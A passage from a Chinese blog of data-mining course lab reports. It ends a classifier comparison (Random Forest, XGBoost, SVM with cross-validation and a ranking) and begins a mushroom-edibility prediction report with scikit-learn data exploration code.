<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#model</span></span><br><span class="line">RF = RandomForestClassifier()</span><br><span class="line"><span class="comment">#cross validation</span></span><br><span class="line">RF_report = pd.DataFrame(cross_validate(RF, X, y, scoring=scoring))</span><br><span class="line"><span class="comment">#getting required score methods</span></span><br><span class="line">RF_report = RF_report.iloc[:,<span class="number">2</span>:]</span><br><span class="line"><span class="comment">#naming the columns</span></span><br><span class="line">RF_report.columns = scoring</span><br><span class="line"><span class="comment">#naming the index</span></span><br><span class="line">RF_report.index = index</span><br><span class="line"></span><br><span class="line"><span class="comment">#final result collection</span></span><br><span class="line">model_3 = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#Classification report</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Clasification report:\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(RF_report,<span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Mean Scores:\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> score <span class="keyword">in</span> scoring:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\t<span class="subst">&#123;score&#125;</span>: <span class="subst">&#123;<span class="built_in">round</span>(RF_report[score].mean(),<span class="number">4</span>)&#125;</span>&quot;</span>)</span><br><span class="line">    model_3.append(<span class="built_in">round</span>(RF_report[score].mean(),<span class="number">4</span>))</span><br></pre></td></tr></table></figure>
<p><strong>代码解析：</strong></p>
<ol>
<li><code>RF = RandomForestClassifier()</code>: 创建一个随机森林分类器的实例。</li>
<li><code>RF_report = pd.DataFrame(cross_validate(RF, X, y, scoring=scoring))</code>: 使用交叉验证来评估模型的性能。<code>cross_validate</code> 函数返回一个字典，其中包含每次交叉验证的结果。这个字典被转换成一个 DataFrame。</li>
<li><code>RF_report = RF_report.iloc[:,2:]</code>: 选择 DataFrame 中的一部分列。 </li>
<li><code>RF_report.columns = scoring</code> 和 <code>RF_report.index = index</code>: 设置DataFrame 的列名和行名。</li>
<li><code>model_3 = []</code>: 创建一个空列表，用于收集模型的平均分数。</li>
<li>最后，这段代码打印每个评分指标的结果，并计算它们的平均值。这些平均值被添加到了 <code>model_3</code>列表中。</li>
</ol>
<p>输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042347339.png" alt="image.png"></p>
<p>预测结果保存：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample prediction for csv file</span></span><br><span class="line">RF.fit(X_train, y_train)<span class="comment">#training</span></span><br><span class="line">y_predict = RF.predict(X_test)<span class="comment">#predicting</span></span><br><span class="line">Random_Forest = pd.DataFrame(&#123;<span class="string">&#x27;y_test&#x27;</span>:y_test,<span class="string">&#x27;prediction&#x27;</span>:y_predict&#125;)<span class="comment">#df for camparison</span></span><br><span class="line">Random_Forest.to_csv(<span class="string">&quot;Random Forest.csv&quot;</span>)<span class="comment">#export to csv     </span></span><br></pre></td></tr></table></figure>

<h4 id="3-5-XGBoost分类器（XGBoost-Classifier）"><a href="#3-5-XGBoost分类器（XGBoost-Classifier）" class="headerlink" title="3.5 XGBoost分类器（XGBoost Classifier）"></a>3.5 XGBoost分类器（XGBoost Classifier）</h4><p>具体代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#model</span></span><br><span class="line">XGB = XGBClassifier()</span><br><span class="line"><span class="comment">#cross validation</span></span><br><span class="line">XGB_report = pd.DataFrame(cross_validate(XGB, X, y, scoring=scoring))</span><br><span class="line"><span class="comment">#getting required score methods</span></span><br><span class="line">XGB_report = XGB_report.iloc[:,<span class="number">2</span>:]</span><br><span class="line"><span class="comment">#naming the columns</span></span><br><span class="line">XGB_report.columns = scoring</span><br><span class="line"><span class="comment">#naming the index</span></span><br><span class="line">XGB_report.index = index</span><br><span class="line"></span><br><span class="line"><span class="comment">#final result collection</span></span><br><span class="line">model_4 = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#Classification report</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Clasification report:\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(XGB_report,<span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Mean Scores:\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> score <span class="keyword">in</span> scoring:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\t<span class="subst">&#123;score&#125;</span>: <span class="subst">&#123;<span class="built_in">round</span>(XGB_report[score].mean(),<span class="number">4</span>)&#125;</span>&quot;</span>)</span><br><span class="line">    model_4.append(<span class="built_in">round</span>(XGB_report[score].mean(),<span class="number">4</span>))</span><br></pre></td></tr></table></figure>
<p><strong>代码解析：</strong></p>
<ol>
<li><code>XGB = XGBClassifier()</code>: 创建一个XGBoost分类器的实例。</li>
<li><code>XGB_report = pd.DataFrame(cross_validate(XGB, X, y, scoring=scoring))</code>: 使用交叉验证来评估模型的性能。<code>cross_validate</code> 函数返回一个字典，其中包含每次交叉验证的结果。这个字典被转换成一个 DataFrame。</li>
<li><code>XGB_report = XGB_report.iloc[:,2:]</code>:选择 DataFrame 中的一部分列。</li>
<li><code>XGB_report.columns = scoring</code> 和 <code>XGB_report.index = index</code>: 设置DataFrame 的列名和行名。</li>
<li><code>model_4 = []</code>: 创建一个空列表，用于收集模型的平均分数。</li>
<li>最后，这段代码打印每个评分指标的结果，并计算它们的平均值。这些平均值被添加到了 <code>model_4</code> 列表中。</li>
</ol>
<p>输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042347340.png" alt="image.png"></p>
<p>预测结果保存：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample prediction for csv file</span></span><br><span class="line">XGB.fit(X_train, y_train)<span class="comment">#training</span></span><br><span class="line">y_predict = XGB.predict(X_test)<span class="comment">#predicting</span></span><br><span class="line">XGBoost=pd.DataFrame(&#123;<span class="string">&#x27;y_test&#x27;</span>:y_test,<span class="string">&#x27;prediction&#x27;</span>:y_predict&#125;)<span class="comment">#df for camparison</span></span><br><span class="line">XGBoost.to_csv(<span class="string">&quot;XGBoost.csv&quot;</span>)<span class="comment">#export to csv     </span></span><br></pre></td></tr></table></figure>

<h4 id="3-6-支持向量机（Support-Vector-Machines）"><a href="#3-6-支持向量机（Support-Vector-Machines）" class="headerlink" title="3.6 支持向量机（Support Vector Machines）"></a>3.6 支持向量机（Support Vector Machines）</h4><p>具体代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#model</span></span><br><span class="line">SVM = SVC(kernel = <span class="string">&#x27;linear&#x27;</span>)</span><br><span class="line"><span class="comment">#cross validation</span></span><br><span class="line">SVM_report = pd.DataFrame(cross_validate(SVM, X, y, scoring=scoring))</span><br><span class="line"><span class="comment">#getting required score methods</span></span><br><span class="line">SVM_report = SVM_report.iloc[:,<span class="number">2</span>:]</span><br><span class="line"><span class="comment">#naming the columns</span></span><br><span class="line">SVM_report.columns = scoring</span><br><span class="line"><span class="comment">#naming the index</span></span><br><span class="line">SVM_report.index = index</span><br><span class="line"></span><br><span class="line"><span class="comment">#final result collection</span></span><br><span class="line">model_5 = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#Classification report</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Clasification report:\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(SVM_report,<span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Mean Scores:\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> score <span class="keyword">in</span> scoring:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\t<span class="subst">&#123;score&#125;</span>: <span class="subst">&#123;<span class="built_in">round</span>(SVM_report[score].mean(),<span class="number">4</span>)&#125;</span>&quot;</span>)</span><br><span class="line">    model_5.append(<span class="built_in">round</span>(SVM_report[score].mean(),<span class="number">4</span>))</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p><strong>代码解析：</strong></p>
<ol>
<li><code>SVM = SVC(kernel = &#39;linear&#39;)</code>: 创建一个支持向量机的实例。这里使用的是线性核函数。</li>
<li><code>SVM_report = pd.DataFrame(cross_validate(SVM, X, y, scoring=scoring))</code>: 使用交叉验证来评估模型的性能。<code>cross_validate</code> 函数返回一个字典，其中包含每次交叉验证的结果。这个字典被转换成一个 DataFrame。</li>
<li><code>SVM_report = SVM_report.iloc[:,2:]</code>:选择 DataFrame 中的一部分列。</li>
<li><code>SVM_report.columns = scoring</code> 和 <code>SVM_report.index = index</code>: 设置DataFrame 的列名和行名。</li>
<li><code>model_5 = []</code>: 这行代码创建一个空列表，用于收集模型的平均分数。</li>
<li>最后，这段代码打印每个评分指标的结果，并计算它们的平均值。这些平均值被添加到了 <code>model_5</code> 列表中。</li>
</ol>
<p>输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042347341.png" alt="image.png"></p>
<p>预测结果保存：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample prediction for csv file</span></span><br><span class="line">SVM.fit(X_train, y_train)<span class="comment">#training</span></span><br><span class="line">y_predict = SVM.predict(X_test)<span class="comment">#predicting</span></span><br><span class="line">Support_Vector_Machines=pd.DataFrame(&#123;<span class="string">&#x27;y_test&#x27;</span>:y_test,<span class="string">&#x27;prediction&#x27;</span>:y_predict&#125;)<span class="comment">#df for camparison</span></span><br><span class="line">Support_Vector_Machines.to_csv(<span class="string">&quot;Support Vector Machines.csv&quot;</span>)<span class="comment">#export to csv     </span></span><br></pre></td></tr></table></figure>


<h1 id="四、实验结果-5"><a href="#四、实验结果-5" class="headerlink" title="四、实验结果"></a>四、实验结果</h1><p>通过上述步骤，获得了上述模型的相关性能，现在对它们进行比较，将它们并排显示，并比较不同模型的表现。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Models = pd.DataFrame(&#123;</span><br><span class="line">    <span class="string">&#x27;Logistic Regression&#x27;</span>: np.array(model_1),</span><br><span class="line">    <span class="string">&#x27;Decision Tree&#x27;</span>: np.array(model_2),</span><br><span class="line">    <span class="string">&#x27;Random Forest&#x27;</span>: np.array(model_3),</span><br><span class="line">    <span class="string">&#x27;XGBoost&#x27;</span>: np.array(model_4),</span><br><span class="line">    <span class="string">&#x27;Support Vector Machines&#x27;</span>: np.array(model_5)&#125;)</span><br><span class="line">Models.index = scoring</span><br><span class="line"><span class="comment">#Models.sort_values(by=&#x27;Score&#x27;, ascending=False)</span></span><br><span class="line">Models</span><br></pre></td></tr></table></figure>
<p>输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042347342.png" alt="image.png"><br>由以上报告可以得出，在本数据集上，Logistic Regression模型以及XGBoost模型表现得较为优秀。</p>
<p>具体排名：<br><strong>ranking:</strong><br><strong>accuracy</strong> - 1. XGBoost 2. Logistic Regression 3. Random Forest 4. Decision Tree 5. Support Vector Machines</p>
<p><strong>precision</strong> - 1. XGBoost 2. Logistic Regression 3. Random Forest 4. Decision Tree 5. Support Vector Machines</p>
<p><strong>recall</strong> - 1. Logistic Regression 2. Random Forest 3. Decision Tree 4. XGBoost     5. Support Vector Machines  </p>
<p><strong>f1</strong> - 1. XGBoost 2. Logistic Regression 3. Random Forest 4. Decision Tree 5. Support Vector Machines</p>
<p><strong>final ranking:</strong></p>
<ol>
<li>XGBoost</li>
<li>Logistic Regression</li>
<li>Random Forest</li>
<li>Decision Tree</li>
<li>Support Vector Machines</li>
</ol>
<h1 id="五、实验分析-5"><a href="#五、实验分析-5" class="headerlink" title="五、实验分析"></a>五、实验分析</h1><p>此次实验，针对本数据集使用了多个模型进行训练以及评估，同时也采用了包括accuracy、precision、recall、f1等多种模型评估指标，使得本次实验的模型对比较为全面，也更为严谨。</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/06/5879215f93d2.html">No title</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-06-04</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/">课程笔记</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/">数据挖掘</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">实验报告</a></span><div class="content"><h1 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h1><p>(1)目的是建立一个模型，可以根据蘑菇的特征预测蘑菇的食用性。<br>(2) 写出实验报告。</p>
<h1 id="二、实验原理"><a href="#二、实验原理" class="headerlink" title="二、实验原理"></a>二、实验原理</h1><p>(1)支持向量机（SVM）： 支持向量机是一种监督学习算法，用于二分类和多分类问题。在手写体识别任务中，S和VM可以被用来将手写数字图像分为不同的类别。SVM通过寻找一个最优的超平面来将不同类别的数据点分开。对于手写数字识别，每个图像被表示为一组特征向量，并与相应的标签（数字类别）相关联。SVM通过学习一个决策边界，使得不同类别的图像在特征空间中被最大化地分离。  </p>
<p>(2)K最近邻算法（K Nearest Neighbors）： K最近邻算法是一种基于实例的学习方法，用于分类和回归问题。对于手写体识别任务，K最近邻算法可以用于根据与目标图像最相似的K个训练样本的标签来预测目标图像的类别。算法通过计算目标图像与所有训练图像之间的距离（如欧氏距离）来确定最相似的训练样本，然后根据K个最相似样本的标签进行投票来确定目标图像的类别。   </p>
<p>(3) 随机森林分类器（Random Forest Classifier）： 随机森林是一种集成学习方法，它由多个决策树组成。每个决策树都是基于不同的训练样本和特征子集构建的。在手写体识别任务中，随机森林分类器可以通过将图像的特征输入到每个决策树中，并将决策树的预测结果进行投票来确定图像的类别。随机森林具有良好的泛化能力和抗过拟合能力，并且在处理高维特征空间和大规模数据集时表现良好</p>
<h1 id="三、实验内容和步骤"><a href="#三、实验内容和步骤" class="headerlink" title="三、实验内容和步骤"></a>三、实验内容和步骤</h1><h2 id="1-实验内容"><a href="#1-实验内容" class="headerlink" title="(1)实验内容"></a>(1)实验内容</h2><ol>
<li>用python编写程序，通过SVM、K Nearest Neighbors、Random Forest Classifier分别实现根据蘑菇的特征预测蘑菇的食用性</li>
<li>分别评估模型</li>
</ol>
<h2 id="2-实验步骤"><a href="#2-实验步骤" class="headerlink" title="(2)实验步骤"></a>(2)实验步骤</h2><ol>
<li>相关库的导入</li>
<li>预处理和数据分析</li>
<li>机器学习模型</li>
</ol>
<p>具体步骤：</p>
<h3 id="1-相关库的导入"><a href="#1-相关库的导入" class="headerlink" title="1. 相关库的导入"></a>1. 相关库的导入</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os <span class="comment">#paths to file</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np <span class="comment"># linear algebra</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd <span class="comment"># data processing</span></span><br><span class="line"><span class="keyword">import</span> warnings<span class="comment"># warning filter</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ploting libraries</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt </span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"></span><br><span class="line"><span class="comment">#feature engineering</span></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> OneHotEncoder</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> LabelEncoder</span><br><span class="line"></span><br><span class="line"><span class="comment">#train test split</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"></span><br><span class="line"><span class="comment">#metrics</span></span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> f1_score</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> recall_score</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> precision_score</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_validate</span><br><span class="line"></span><br><span class="line"><span class="comment">#cross validation</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection  <span class="keyword">import</span> cross_val_score <span class="keyword">as</span> CVS</span><br><span class="line"></span><br><span class="line"><span class="comment">#ML models</span></span><br><span class="line"><span class="keyword">from</span> xgboost <span class="keyword">import</span> XGBClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.tree <span class="keyword">import</span> DecisionTreeClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression</span><br><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> SVC</span><br><span class="line"></span><br><span class="line"><span class="comment">#default theme and settings</span></span><br><span class="line">sns.<span class="built_in">set</span>(context=<span class="string">&#x27;notebook&#x27;</span>, style=<span class="string">&#x27;darkgrid&#x27;</span>, palette=<span class="string">&#x27;deep&#x27;</span>, font=<span class="string">&#x27;sans-serif&#x27;</span>, font_scale=<span class="number">1</span>, color_codes=<span class="literal">False</span>, rc=<span class="literal">None</span>)</span><br><span class="line">pd.set_option(<span class="string">&#x27;display.max_columns&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#warning handle</span></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;always&quot;</span>)</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="2-预处理和数据分析"><a href="#2-预处理和数据分析" class="headerlink" title="2.预处理和数据分析"></a>2.预处理和数据分析</h3><h4 id="2-1-导入数据与查看"><a href="#2-1-导入数据与查看" class="headerlink" title="2.1 导入数据与查看"></a>2.1 导入数据与查看</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Mushroom_df = pd.read_csv(Mushroom_path)</span><br><span class="line">Mushroom_df.head()</span><br></pre></td></tr></table></figure>
<p>输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042040817.png" alt="image.png"></p>
<h4 id="2-2-数据维度"><a href="#2-2-数据维度" class="headerlink" title="2.2 数据维度"></a>2.2 数据维度</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;Data Shape (row, col): &#123;&#125;&quot;</span>.<span class="built_in">format</span>(Mushroom_df.shape)</span><br></pre></td></tr></table></figure>
<p>输出：<br><code>Data Shape (row, col): (8124, 23)</code></p>
<h4 id="2-3-数据基本信息"><a href="#2-3-数据基本信息" class="headerlink" title="2.3 数据基本信息"></a>2.3 数据基本信息</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mushroom_df.info()</span><br></pre></td></tr></table></figure>
<p>输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042043188.png" alt="image.png"></p>
<h4 id="2-4-缺失值处查看"><a href="#2-4-缺失值处查看" class="headerlink" title="2.4 缺失值处查看"></a>2.4 缺失值处查看</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#missing values</span></span><br><span class="line">Mushroom_df.isnull().<span class="built_in">sum</span>()</span><br></pre></td></tr></table></figure>
<p>输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042045622.png" alt="image.png"><br>可见，该数据集并无缺失值。</p>
<h4 id="2-5-查看数据分布情况"><a href="#2-5-查看数据分布情况" class="headerlink" title="2.5 查看数据分布情况"></a>2.5 查看数据分布情况</h4><p>代码将遍历每一列并打印该列的值分布情况</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">M_cols = Mushroom_df.columns.to_list()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Value Distribution:\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> M_cols:</span><br><span class="line">    <span class="built_in">print</span>(col,<span class="string">&quot;\n&quot;</span>,Mushroom_df[col].value_counts(),<span class="string">&quot;\n\n&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042047355.png" alt="image.png"></p>
<h4 id="2-6-数据可视化"><a href="#2-6-数据可视化" class="headerlink" title="2.6 数据可视化"></a>2.6 数据可视化</h4><h5 id="Target-Plot"><a href="#Target-Plot" class="headerlink" title="Target Plot"></a>Target Plot</h5><p><strong>Target Plot</strong>: 这是一种数据可视化技术，通常用于显示目标变量（也称为响应变量或因变量）的分布。帮助理解数据的平衡或不平衡，并可能影响选择的建模策略。</p>
<p>具体代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">total = <span class="built_in">float</span>(<span class="built_in">len</span>(Mushroom_df[M_cols[<span class="number">0</span>]]))</span><br><span class="line">plt.figure(figsize=(<span class="number">6</span>,<span class="number">6</span>))</span><br><span class="line">sns.<span class="built_in">set</span>(style=<span class="string">&quot;darkgrid&quot;</span>)</span><br><span class="line">ax = sns.countplot(Mushroom_df[M_cols[<span class="number">0</span>]])</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> ax.patches:</span><br><span class="line">    height = p.get_height()</span><br><span class="line">    ax.text(p.get_x()+p.get_width()/<span class="number">2.</span>,height + <span class="number">3</span>,<span class="string">&#x27;&#123;:1.2f&#125;&#x27;</span>.<span class="built_in">format</span>(height/total),ha=<span class="string">&quot;center&quot;</span>)</span><br><span class="line">plt.title(<span class="string">&quot;Target Plot&quot;</span>, fontsize = <span class="number">20</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p><strong>代码解析：</strong></p>
<ol>
<li><code>total = float(len(Mushroom_df[M_cols[0]]))</code>: 这行代码计算了目标变量的总实例数。</li>
<li><code>plt.figure(figsize=(6,6))</code>: 这行代码设置了图形的大小。</li>
<li><code>sns.set(style=&quot;darkgrid&quot;)</code>: 这行代码设置了 seaborn 图形的样式。</li>
<li><code>ax = sns.countplot(Mushroom_df[M_cols[0]])</code>: 这行代码创建了一个 countplot，显示了目标变量的每个类别的实例数量。</li>
<li><code>for p in ax.patches: ...</code>: 这个循环在每个条形图上方添加了一个文本，显示了该类别的实例数量占总实例数的百分比。</li>
<li><code>plt.title(&quot;Target Plot&quot;, fontsize = 20)</code>: 这行代码设置了图形的标题和字体大小。</li>
<li><code>plt.show()</code>: 这行代码显示了图形。</li>
</ol>
<p>输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042100812.png" alt="image.png"></p>
<h5 id="Univariate-Plots"><a href="#Univariate-Plots" class="headerlink" title="Univariate Plots"></a>Univariate Plots</h5><p> <strong>Univariate Plots</strong>: 单变量图是一种数据可视化技术，用于显示单个变量（特征）的分布。这可以包括直方图、箱线图、密度图等。这些图可以帮助理解变量的中心趋势（如平均值或中位数）、离散度（如范围或四分位数范围）、形状（如偏度或峰度）以及任何潜在的异常值。</p>
<p>具体代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> M_cols[<span class="number">1</span>:]:</span><br><span class="line">    plt.figure(figsize=(<span class="number">10</span>,<span class="number">4</span>))</span><br><span class="line">    sns.countplot(x=col , data=Mushroom_df ,palette=<span class="string">&#x27;icefire&#x27;</span>)</span><br><span class="line">    plt.title(col, fontsize=<span class="number">14</span>)</span><br><span class="line">    plt.show()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;% of total:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">round</span>((Mushroom_df[col].value_counts()/Mushroom_df.shape[<span class="number">0</span>]),<span class="number">4</span>)*<span class="number">100</span>)</span><br></pre></td></tr></table></figure>
<p><strong>代码解析：</strong></p>
<ol>
<li><code>for col in M_cols[1:]: ...</code>: 这个循环对 <code>M_cols</code> 列表中的每个元素（除了第一个元素）执行以下操作。</li>
<li><code>plt.figure(figsize=(10,4))</code>: 这行代码设置了图形的大小。</li>
<li><code>sns.countplot(x=col , data=Mushroom_df ,palette=&#39;icefire&#39;)</code>: 这行代码创建了一个 countplot，显示了给定特征的每个类别的实例数量。</li>
<li><code>plt.title(col, fontsize=14)</code>: 这行代码设置了图形的标题和字体大小。</li>
<li><code>plt.show()</code>: 这行代码显示了图形。</li>
<li><code>print(&quot;% of total:&quot;)</code>: 这行代码打印了一个字符串，表示接下来的数字是总数的百分比。</li>
<li><code>print(round((Mushroom_df[col].value_counts()/Mushroom_df.shape[0]),4)*100)</code>: 这行代码计算了每个类别的实例数量占总实例数的百分比，并打印了结果。</li>
</ol>
<p>上述代码创建了一系列的单变量图，显示每个特征的分布，并打印了每个类别的实例数量占总实例数的百分比，以下列出部分输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042106429.png" alt="image.png"></p>
